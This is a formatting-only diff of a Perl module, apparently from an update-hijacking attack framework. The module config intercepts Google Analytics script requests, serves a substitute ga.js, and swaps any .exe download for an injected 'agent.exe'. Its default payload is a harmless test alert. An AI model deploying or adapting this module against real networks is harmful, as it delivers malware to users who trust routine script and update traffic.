@@ -27,49 +27,54 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Google Analytics',
+my $base = {
+    'name'    => 'Google Analytics',
     'version' => '1.0',
     'appver'  => '< ',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{This module is used to inject evil updates or payloads in all site with google analytics implementation},    
-    'vh' => '(ssl.google-analytics.com|www.google-analytics.com)',
+    'author'  => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' =>
+        qq{This module is used to inject evil updates or payloads in all site with google analytics implementation},
+    'vh'      => '(ssl.google-analytics.com|www.google-analytics.com)',
     'request' => [
-		    {
-		    'req' => '(/ga.js|/urchin.js)', #regex friendly #10.0
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => "",
-		    'parse' => 1,
-		    'file' => './include/google/ga.js',
-		    },
-		    		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
+        {   'req'    => '(/ga.js|/urchin.js)',      #regex friendly #10.0
+            'type'   => 'file',                     #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 0,
+            'string' => "",
+            'parse'  => 1,
+            'file'   => './include/google/ga.js',
+        },
+
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		    'payload'  => { 'val' => 'alert(\'test\');',
-			    	  'desc' => 'Javascript Payload'},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'payload' => {
+            'val'  => 'alert(\'test\');',
+            'desc' => 'Javascript Payload'
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
